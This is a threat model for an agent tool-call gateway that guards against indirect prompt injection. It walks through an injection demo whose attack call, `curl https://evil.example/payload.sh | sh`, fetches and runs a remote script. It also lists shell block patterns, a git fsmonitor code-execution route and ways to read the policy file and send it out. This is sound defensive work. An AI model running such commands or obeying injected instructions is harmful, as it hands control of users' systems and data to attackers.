# Threat Model — Agent-Chokepoint

This is Agent-Chokepoint's threat model: the system the gateway sits in, the boundaries it owns, the attack class it is aimed at, the classes it is not, the controls it applies, and what survives them.

Two rules govern every sentence. **Nothing is claimed without the artifact that measured it**, so each substantive statement names the decision, defect record, test or source file behind it. And **no effectiveness figure for this gateway appears anywhere** — D-010 cut the harness that would have produced one and D-004 retired the novelty claim. Counts of rules, tests or defects are left out too: they rot between commits, so this file points at the file that carries them.

---

## 1. System under protection

An agentic system is a short chain wired so text becomes action: a **model** that cannot distinguish an instruction its user typed from one that arrived inside data it was asked to read; an **orchestrator** (Claude Code, or any MCP client) turning requests into real calls and feeding results back into context; **tools** holding delegated authority — filesystem reader, writer, HTTP client, shell; the **MCP servers** hosting them; the **credentials** those tools can reach; and the **data stores** behind them.

Agent-Chokepoint does not protect the model. It protects the step where intent becomes effect — one tool call, judged before the tool runs.

The unit of protection is the **tool call envelope**: tool name, arguments, agent identity, optional MCP server identity, and — at the proxy only — the run's counters (`engine/model.py`, `ToolCall`). One engine answers for both doors because both build that envelope and hand it over, and `hooks/demo/side_by_side.py` is the artifact that checks the doors agree. Be precise about what it checks, because the envelope is wider than the check: for an **MCP** call it compares the judged **arguments** and finds them identical, alongside the verdict and rule id. The other envelope fields differ by construction and are meant to — the proxy carries run counters and its own `--agent-id`, the hook carries none and derives its server from the tool name — so what is demonstrated is that the two doors judge the same *call content* and reach the same answer, not that every field matches. A **native** Claude Code built-in is *translated* onto the policy vocabulary through `NATIVE_TOOLS` and is explicitly not identical at all; there the harness asserts only that the translation carried the canonical argument unchanged.

## 2. Trust boundaries

**Boundary 1 — untrusted content into the model.** Content enters through tool *results*. Nothing here inspects a tool result, so by the time this project is asked anything the boundary is crossed and the model already influenced. This is the boundary the enforcement point sits *after*, and it is why §4's honesty note is structural: what the gateway sees is tool calls, never the content that provoked them.

**Boundary 2 — intent into effect.** The one this project owns; every tool call crosses it. The **MCP proxy** (`proxy/__main__.py`, `serve()`) is stdio on both sides — `stdio_server()` toward the agent, `stdio_client()` toward an upstream it spawns as its own child. It binds no socket and listens on no port, so it is reachable only by the process that launched it; co-location is not a preference but what the transport is, which is why every deployment probe is an `exec` rather than a network call. The **Claude Code hook** (`hooks/chokepoint_hook.py`) is one short-lived process per call, JSON in and out, keeping nothing between calls — which is why it enforces no `limits:`.

Authority lives on the far side, in the tool. Neither door holds any: each answers a question and the tool acts or does not. A hook `allow` is this control declining to object, never a grant — Claude Code still applies the user's own permission rules on top.

**Boundary 3 — the deployment.** A chokepoint is only a chokepoint if nothing reaches a tool without traversing it, and no code here can check that; `deploy/` is where the claim becomes true or false (limit 5). Its assumptions are §8.

One boundary is an output and easy to miss: **the decision stream**. One process writes one file and concurrent writers are unsupported (`telemetry/event-schema.json`, WHO-WRITES-THE-FILE), so the audit trail's integrity is also a deployment property.

## 3. Actors

**The operator** writes the policy, runs the deployment, reads the events — trusted, and the policy trusted with them. Nothing checks that a policy expresses what its author meant; the loader checks only that it is well formed and refuses shapes that provably enforce less than they read as (§6). **The end user** types the request, and is trusted here — a user who wants the agent to do something destructive is a different threat (§5).

**The attacker** controls content the agent will read and nothing else — a web page, a file in a cloned repo, an issue body, an inbox. They cannot reach the agent's process, the policy, the enforcement point or the log. Their primary lever is *text the model will treat as instructions*, which is why an action-level control is worth building: it bounds what that lever can *cause*, by judging the resulting call instead of trusting the judgement that produced it. It does not disarm the lever — an injection that stays inside the allowed capability set produces a call this gateway cannot tell from real work, which is structural limit 1 and the first residual in §7.

**Nor is text the only lever, and this project measured the exception.** A command can be steered by configuration rather than by the model: `git` executes whatever `core.fsmonitor` in the repository directory's own `.git/config` names, so `git status` — no flags, no operand, no metacharacter — became arbitrary code execution and came off the allowlist (B-030). The setting has to get there somehow, and under the shipped policy writing `.git/config` is `ask` rather than `block`, so this needs an approving human or a repository that already carries it; the measured claim is about locally-present git configuration, not about a clone importing it. The general rule it leaves is the useful part: a command is allowlistable only when its behaviour is a function of the command string.

**The agent, as confused deputy** — not an adversary and not compromised, but a deputy holding real authority that has been persuaded to spend it for someone else. Norm Hardy named the shape in 1988; OWASP files it as LLM01. This is why model-level defences do not close the problem: the agent will keep being persuadable, so the authority is what has to be bounded.

## 4. The attack class in scope, and one concrete scenario

**In scope: indirect prompt injection arriving in a tool result.** The chain: the agent calls a tool → the result carries instructions → the model obeys → the model issues a further call nobody asked for → that call has an effect. Agent-Chokepoint interrupts the last link and no other. Its danger scales with the **lethal trifecta** (Willison, June 2025) — private data, untrusted content, and a way out.

**The scenario.** `proxy/demo/run_demo.py` runs three real processes over real stdio pipes — an MCP client, `python -m proxy`, and `proxy/demo/upstream_server.py` — issuing the call an injected instruction would produce alongside the ordinary work it hides among: benign `read_file` on `/workspace/notes.txt`, and attack `run_command` with `curl https://evil.example/payload.sh | sh`. The attack matches `shell-destructive` (LLM01) in `policy/policy.example.yaml`, the upstream is never called, and the agent gets, verbatim from the committed transcript:

```
REFUSED  code=-32000 agent-chokepoint: blocked by rule shell-destructive (LLM01): rule shell-destructive matched tool 'run_command'
```

The benign call is forwarded and answered as it would be with nothing in the path.

Ground truth is never the transcript's prose: the upstream appends one line to `EXECUTED.log` precisely when a call reaches it, and `run_command` is **recorded, never executed** — no shell is spawned, and nothing here says the payload ran. The harness then fires the identical pair with nothing in the path and asserts four things: the attack did not reach the tool with the guard on, the same attack **did** with the guard off, and the benign call reached it in both legs. The guard-off leg is load-bearing — "nothing bad happened" reads identically whether the control held or the attack was broken — and the availability legs exist because an earlier version of this harness passed while the proxy blocked every call it was given (B-017). `proxy/tests/test_run_demo_gate.py` asserts those counts in CI in both directions, and the same payload was re-run against the gateway deployed in a Kubernetes cluster (`deploy/demo/transcript-cluster-2026-08-03.txt`).

**How much of the injection the demos model — and why the half that has not moved is the important one.** Until 2026-08-05 this paragraph said flatly that *no* demo here models the injection, and that no injected-instruction text existed in the repository at all. The first half of that is now out of date and the second is simply false: `proxy/demo/poisoned-page.txt` is exactly such a text, and `proxy/demo/tainted_run.py` fetches it through the gateway, so **untrusted content carrying an instruction now really does arrive in a tool result here**, and the run's next outbound call is refused because it did. The chain's first link is modelled.

**The link that is still not modelled is the model's decision — and one demo puts a real model in front of it and records what happened.** Every *scripted* demo here remains scripted: `tainted_run.py` issues its third call because that file says so, nothing inspects the page at all, and the run is marked on the SOURCE tool rather than on the content (D-031); `run_demo.py`'s attack is likewise a constant. `hooks/demo/real_agent_run.py` drives a real Claude Code session, but its steps arrive in the operator's own prompt, deliberately free of security framing (its `build_prompt` records why), over files carrying no instructions.

`proxy/demo/real_model_attacks.py` is the one that closes the wiring: a real headless Claude Code session, holding all four of the policy's tools, reads a page carrying an injected instruction through this gateway and then does whatever it decides to do. **In all three recorded sessions the model did not make the call the page asked for.** What is observable is exactly that: the session emitted no further tool call, and its final text identified the injected block, said it would not act on it, and surfaced it to the user it had been told to hide it from. Whether the cause was the model's own judgement is NOT established — the session also carried the operator's own Claude Code configuration, a system prompt, hooks and thirty-odd built-in tools, and no leg isolates one of those from the others. The record separates the model's own account of itself as CLAIMED for the same reason. `proxy/demo/model-runs/records/` holds each session's stream, decision log and transcript; none of them is a claim about this gateway, and each one says so where a reader will look. What these sessions therefore establish is narrow and worth stating exactly: **the missing link is now wired and instrumented — a model's own tool calls are captured, judged and replayable — and on this date, with this model and these three pages, no call reached the gateway for it to refuse.** A page that a model declines produces no evidence about an enforcement point, which is the same reason `run_demo.py` has a guard-off leg.

Two things follow and neither is optional. The gateway's value does not rest on how any model behaves — that is the whole argument for an action-level control (§3, the confused deputy), and a model that declines today is exactly the model that may not decline tomorrow, on a page nobody has written yet. And **no rate is computed from three sessions, or from three hundred**: "how often a model obeys" is the validation harness D-010 cut and D-004's retired novelty claim, and it is out of scope here in either direction — a decline is no more a published number than a compliance would be. So the demonstrated claims remain **"a call of this shape is refused before it reaches the tool, and ordinary work is not"** and, for the taint demo, **"a run that consumed an untrusted result was then refused when it tried to send"** — never "an injection was stopped end to end", and never "injections are declined". The detections hold the same line: `chokepoint-injection-triggered-call.yml` fires on an LLM01-mapped block and calls it the kind of call an injection produces, not evidence one occurred.

**The exfiltration leg is a different rule, proven elsewhere.** `net-egress-sensitive` (LLM02) stops a credential riding out in an otherwise permitted request; `run_demo.py` does not exercise it. Its both-directions evidence, against the shipped policy file rather than a fixture, is in `policy/tests/test_example_policy_rules.py`.

## 5. Attack classes out of scope, and why each

- **Direct prompt injection and jailbreaks** — the user is the attacker; a different trust model, crowded field.
- **Model alignment, output safety, model-level content filtering** — the category this project deliberately does not enter.
- **A malicious MCP server upstream of the proxy** — trust stops at the proxy; tools behind it are assumed to do what they claim (limit 3).
- **Anything that never becomes a tool call** — outside the boundary entirely (limit 2), which makes §4's honesty note structural rather than fixable.
- **Host compromise** — an attacker executing code on the machine reads the policy, credentials and log directly.
- **Multi-cloud deployment** — one cluster, one path.
- **A validation harness, and every effectiveness number with it** — D-010 cut the corpus and scorecard, D-004 the novelty claim. Reading the prior art settled the measurement posture, and it settled it in both directions: two published numbers in this field cannot be re-run by anyone outside the project that produced them — AgentJail's redactor-encoding claim cites fixture directories absent from its repository, and mcp-firewall's block-rate figure comes with no corpus, method or date — while MCP Guardian's scorecard **reproduced exactly from a fresh clone**, which is part of why D-004 retired the differentiator rather than defending it.

## 6. Controls, mapped to the step each interrupts

**Links one through three — the poisoned content, the model reading it, the model deciding to obey — have no control here.** The enforcement point sees tool calls, so nothing in *this* design can reach them; controls for those links exist elsewhere in the field (content provenance, model-level filtering) and are deliberately out of scope (§5), not impossible in general. Stated first, because a control map opening with its strengths invites the reader to assume the earlier links were covered.

**Link four, the call, is judged before the tool runs.** Deny by default (`defaults.on_no_match: block`); an unmatched call is refused as `default:on_no_match`. Every rule in `policy/policy.example.yaml` carries an id and an OWASP mapping: `fs-read-scoped` (LLM01) scopes reads and denies credential directory names at any depth (D-014); `fs-write-scoped` (LLM01) puts writes at `ask`; `net-fetch-allowlist` (LLM01) allowlists hosts against an unambiguously parsed URL (B-004); `net-egress-sensitive` (LLM02) blocks a known credential format in an outbound argument; `shell-destructive` (LLM01) matches three literal spellings — `rm -rf`, a `curl` pipeline into `sh` or `bash`, and `chmod 777` — rather than the semantic classes behind them, so `rm -fr`, a non-`curl` download piped into a shell, and `chmod 0777` are not matched by *it* (they fall to deny-by-default, since `run_command` has only the tiny allow rule below); `shell-readonly` (LLM01) is that rule, kept deliberately small so a non-blocking case stays reachable (D-016).

**The argument is resolved before it is judged.** `pep/canonicalize.py` runs at both doors ahead of `decide()` (D-011): realpath, then a component walk substituting the on-disk spelling only where `os.stat` proves `(st_dev, st_ino)` identity. What it cannot place it refuses as `pep:unresolvable-path`. That mechanism has been wrong before, on record: `str.lower` is not a caseless match (B-028), and an ancestor stored in one Unicode normal form and spelled in another aborted the walk and switched the deny list off below it (B-029) — so the comparison is now Unicode canonical caseless matching.

**Precedence is not file order.** `decide()` resolves block over ask over allow across all matching rules, which lets `net-egress-sensitive` override `net-fetch-allowlist` on the same call.

**Volume and loop abuse are capped** — `limit:max_tool_calls_per_run`, `limit:max_wall_clock_seconds`, `limit:max_repeated_identical_calls` (LLM10), checked before any rule, per run, where a run is one MCP client session with the proxy (D-022). The hook enforces none and says so.

**`ask` never becomes an allow.** The proxy has no approval channel wired, so it fails closed (D-005); the hook hands it to Claude Code's prompt, because that *is* one.

**The policy is itself a control, so shapes that enforce less than they read as are refused at load** — a rule with no predicates (D-012); a `~` in a prefix, which would bind to the loading process's home (D-017); a relative prefix, which once made a deny list inert while reading as protective (B-006); an unanchored `command_matches_any` in an `allow` rule, which permits any compound command containing the permitted form (D-018); a `when` built only of negatives (D-019); a rule id claiming a reserved prefix, which would silently break a detection (D-026). Each was measured *before* being ruled rather than after — D-018, D-019 and D-026 against every policy file in the repo, the others against the shipped policy — so the cost was chosen rather than discovered. It was not always the whole cost: D-012 also stopped two rules in the hook's test fixture loading, which surfaced when the fixture broke.

**A judged call is recorded, and known credential formats do not ride into the record.** Both statements are narrower than they want to be, so they are written narrow. Both doors emit one event per judged call with the same key set — on the ordinary path; if the hook cannot write its event file it blocks the call and exits without recording one, which is fail-closed and also a judged call with no event (`hooks/tests/test_hook.py::test_e2e_unwritable_log_blocks_instead_of_failing_open`). Redaction keys off argument content rather than the rule that fired — it already did before B-015, whose finding was that the tool *name* and the `reason` string it leaked into were not covered; every logging surface at both doors goes through it now. What it catches is the fixed pattern list within the documented scan depth: an unlisted credential format, a secret nested past the scan bound, or one welded into a tool name with no word boundary is not redacted, each recorded in `docs/LIMITATIONS.md`. A gateway whose **policy** fails to load announces that in the same stream: the proxy writes one `proxy:policy-error` and exits without serving (D-029), the hook denies every call with `hook:policy-error`. No other startup failure does — a bad flag, or an upstream that cannot spawn, writes nothing at all, and the published schema says plainly that a silent stream stays ambiguous and needs a liveness signal from outside it. The Sigma rules read that stream, each fired on real events beside the benign neighbour it must not fire on.

**The deployment makes the enforcement point unavoidable, or it does not.** `deploy/` pins command resolution — a fixed `PATH` and an absolutely-spelled upstream command, so a process this chart spawns cannot be redirected to an attacker's program (D-020); gates readiness on enforcement having run and been *right* rather than on the process having started; and ships default-deny egress. **What the pinning artifact proves is narrower than D-020's motivation.** `deploy/demo/path_pinning.py` exercises the proxy's own spawn of its upstream, which is what this deployment actually executes; the shipped upstream records `run_command` instead of running it, so no artifact here exercises a real shell resolving `shell-readonly`'s bare names. For a deployment whose upstream really executes commands, D-020 is a requirement its runner must meet, not a property this chart has already demonstrated for it. D-021 is the rule that makes any of that mean anything — a guard is proven only by a weakened release that removes exactly that guard, with both legs run. Two guards are proven that way and ship the values files to do it, `values-no-networkpolicy.yaml` and `values-unpinned-path.yaml`; that is how kind's default CNI was caught accepting NetworkPolicy objects and enforcing none. The pod-security hardening is deliberately **not** toggleable — it is hardcoded in the template precisely so it cannot be switched off with `--set` — so it is proven instead by reading it back off the API server rather than by a weakened release.

## 7. Residual risk

`docs/LIMITATIONS.md` is the source of truth and is not duplicated here; this names the shapes.

Surviving every control above, from that file's **structural limits**: **injections using only already-allowed capabilities** (1 — the hardest, and no better rule closes it); **anything that never becomes a tool call** (2); **a hostile MCP server behind the proxy** (3); **semantic exfiltration inside allowed content** (4); **a deployment that lets calls route around the enforcement point** (5); and **credentials in formats the fixed pattern list does not name** (16 — the matchers are published credential formats rather than entropy scoring or a classifier). Read the redaction marker precisely in both directions: it means *a string matching one of those formats* was present, not that a live credential was — the suite's own vector is a well-formed fake key, and documentation examples and revoked keys trip it identically — and a clean event does not mean the call was clean.

**The hook door carries residuals of its own**, and an operator running only the hook is exposed to them: it enforces no `limits:` at all, so an agent looping on a permitted call is rate-capped through the proxy and is not through the hook; and Claude Code tools outside the policy vocabulary are neither judged nor logged, so a read denied as `Read` can be retried as an unmapped tool and nothing records it.

Two lists there should not be skipped. **Known false-ALLOW sources** records rule shapes that read as restrictive and are not. **Known false-positive sources** records the opposite direction, the benign work this gateway refuses, graded by whether each class was hit in a running deployment, hit only inside this project's own corpus, or derived from the code. The decide-then-open race is structural: resolution happens at decision time and the kernel opens the file later, which is what deciding in one process and opening in another means.

**What an operator should do about it.** The residual is deployment-shaped, which is also what an acceptance check on the event schema found: readers handed only the schema still needed the deployed policy, the configured caps, and which of their tools send data out. Concretely — put the gateway somewhere nothing can route around (limit 5 is the one that voids all the others); run the proxy rather than the hook alone if per-run caps matter, and recycle its session under those caps or a long-lived gateway will refuse everything past them; write path prefixes in their resolved form; keep the policy file, the decision log and any file declared under `hidden_context:` outside every prefix the agent may write **or read** — the read half is B-088 and the shipped Helm chart already does both; treat a redacted event as "a credential was present" but never a clean event as "the call was clean"; and pair this with controls aimed at the links it does not cover, since nothing here touches the injection itself. The one thing an operator should not do is read an absence of events as an absence of calls.

## 8. Assumptions

Each must hold for the model above to hold. Where a check exists it is named; where none does, that is said.

1. **The proxy or hook is actually in the path.** Not checkable from code — what `deploy/` is for; limit 5 is what happens when it is false.
2. **The enforcement point's filesystem is the tool's.** A proxy fronting a server in another container answers about a different file than the one opened (limit 10).
3. **The command runner pins resolution.** A bare command name is allowlistable only where the runner cannot be pointed at another program; the chart does this (D-020). Does **not** hold for a deployment not using the chart.
4. **The cluster substrate enforces what the manifests request.** Proven, not assumed: on kind's default CNI the same probe succeeded with and without a default-deny egress policy applied while the object showed present (D-021).
5. **One writer per decision-log file.** Line atomicity is not promised for concurrent writers.
6. **The policy file and the decision log are trusted, correctly authored, and neither writable NOR readable by the agent.** The loader refuses unsound shapes (§6) but cannot know what the author meant. The shipped example puts in-workspace writes at `ask`, so an approving human is part of this wherever a policy sits under such a prefix. *(Readability was added to this assumption on 2026-08-06 — B-088. It said only "not writable", and writability is the wrong half for a disclosure risk: OWASP LLM08:2026 scenario #3 is an attacker reading the guardrail and crafting around what it says. Measured against the shipped example policy, `read_file /workspace/policy.yaml` and `read_file /workspace/chokepoint-decisions.jsonl` are both `allow / fs-read-scoped`, and the whole policy text then rides out through an `allow / net-fetch-allowlist` fetch. The shipped Helm chart keeps both files outside every read prefix — `/etc/chokepoint/policy.yaml` and `/sandbox` are both `block / default:on_no_match` — so this assumption holds for the chart and is an operator's job for any other placement. Pinned by `policy/tests/test_example_policy_rules.py::TestTheGatewaysOwnFilesAreOrdinaryFilesToThisPolicy`.)*
7. **Policy path prefixes are written in resolved form**, since call paths arrive canonicalized and prefixes deliberately do not — an unresolved spelling matches nothing (limit 10).
8. **Clocks are the emitting process's own**, so cross-door ordering is only as good as clock skew.
9. **The agent cannot unilaterally create the preconditions the worst residuals need.** Measured against the shipped policy: no tool in the vocabulary makes a hard link (B-032), and arming a `PATH` shim needs a writable directory already on the runner's path — `write_file /workspace/bin/ls` comes back **`ask`**, not `block`, so this one rests on a human declining that prompt rather than on the policy refusing it (B-035).
